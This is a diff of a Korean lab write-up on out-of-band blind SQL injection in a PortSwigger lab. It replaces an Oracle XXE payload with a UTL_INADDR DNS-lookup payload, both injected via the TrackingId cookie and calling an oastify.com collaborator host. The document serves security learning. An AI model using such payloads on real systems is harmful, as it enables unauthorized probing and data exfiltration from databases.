@@ -31,21 +31,19 @@ draft: false
 
 ### 초기 관찰
 
-입력 지점은 상품 페이지 요청의 `TrackingId` 쿠키였다. 원래 쿠키로 요청했을 때 HTTP 200, 본문 3719자가 반환됐고 실습은 미완료 상태였다. 외부 조회 대상에는 PortSwigger 공개 Collaborator 서버의 `*.oastify.com` 아래에 고유한 하위 도메인을 사용했다.
+입력 지점은 쇼핑몰 첫 화면 요청의 `TrackingId` 쿠키였다. 새 실습 인스턴스에서 원래 쿠키로 요청했을 때 HTTP 200, 본문 11501자가 반환됐고 실습은 미완료 상태였다. 외부 조회 대상에는 PortSwigger 공개 Collaborator 서버의 `*.oastify.com` 아래에 고유한 하위 도메인을 사용했다.
 
 ### 실행 과정
 
-`TrackingId` 값 뒤에 `UNION SELECT`를 붙이고, Oracle의 `XMLTYPE`과 `EXTRACTVALUE`가 외부 엔티티의 URL을 처리하도록 구성했다. 상품 페이지 경로와 `productId`는 그대로 두고 쿠키에만 주입했다. 아래의 `<고유값>`은 실습 중 생성한 임의 문자열이다.
+`TrackingId` 값 뒤에 `UNION SELECT`를 붙이고 Oracle의 `UTL_INADDR.GET_HOST_ADDRESS`를 호출했다. 이 함수는 **호스트 이름을 IP 주소로 해석해 반환**한다. 따라서 인자로 고유한 Collaborator 호스트 이름을 주면 데이터베이스 서버가 그 이름을 조회한다. 이 실습은 반환된 IP를 화면에 보여 주는 것이 아니라, 조회 과정에서 일어나는 DNS 요청을 목표로 한다. `FROM dual`은 Oracle에서 이 표현식을 계산하기 위한 한 행짜리 테이블이다. [Oracle 함수 문서](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_INADDR.html)
 
 ~~~sql fragment
-<원래 TrackingId>' UNION SELECT EXTRACTVALUE(
-  XMLTYPE('<?xml version="1.0" encoding="UTF-8"?>
-    <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://<고유값>.oastify.com/"> %remote;]>'),
-  '/l'
-) FROM dual--
+<원래 TrackingId>' UNION SELECT
+UTL_INADDR.GET_HOST_ADDRESS('<고유값>.oastify.com')
+FROM dual--
 ~~~
 
-PowerShell에서는 이 값을 `Cookie` 헤더의 `TrackingId`에 넣어 요청했다. 쿠키 구분자와 충돌하지 않도록 페이로드의 `%`, `;`, 공백, `:`, `?`, `=`를 인코딩한 뒤 전송했다. 주입 요청 직후의 결과는 정상 요청과 같은 **HTTP 200, 본문 3719자, 미완료**였다. 3초 뒤 원래 쿠키로 다시 요청하자 **HTTP 200, 본문 6812자**와 실습 완료 배너가 나타났다.
+PowerShell에서 구문의 공백을 `+`로 바꾼 뒤 `Cookie` 헤더의 `TrackingId`에 넣어 첫 화면을 요청했다. 주입 직후에는 정상 요청과 같은 **HTTP 200, 본문 11501자, 미완료**였다. 몇 초 뒤 다시 첫 화면을 요청하자 **HTTP 200, 본문 14505자**와 실습 완료 배너가 나타났다.
 
 ## 최종 결과
 
@@ -53,7 +51,7 @@ PowerShell에서는 이 값을 `Cookie` 헤더의 `TrackingId`에 넣어 요청�
 
 ## 배운 점
 
-비동기식 조회에서는 주입 직후 웹 응답이 정상 응답과 같아도 외부 상호작용이 나중에 일어날 수 있다. 응답에 변화가 없을 때도 외부 조회를 유발하고 잠시 뒤 완료 상태를 확인하는 흐름이 유효했다.
+`UTL_INADDR.GET_HOST_ADDRESS`는 IP 주소를 얻는 함수지만, 호스트 이름을 해석하는 과정 자체가 이 문제에서 필요한 DNS 조회를 만든다. Oracle에서는 네트워크 접근 권한에 따라 이 함수가 제한될 수 있으므로 항상 통하는 구문은 아니다. 이번 인스턴스에서는 짧은 함수 호출만으로 완료됐다. 비동기식 조회라 주입 직후의 웹 응답은 그대로였고, 잠시 뒤 완료 상태가 바뀌었다. [PortSwigger SQL 인젝션 치트시트](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
 ## 관련 개념
 
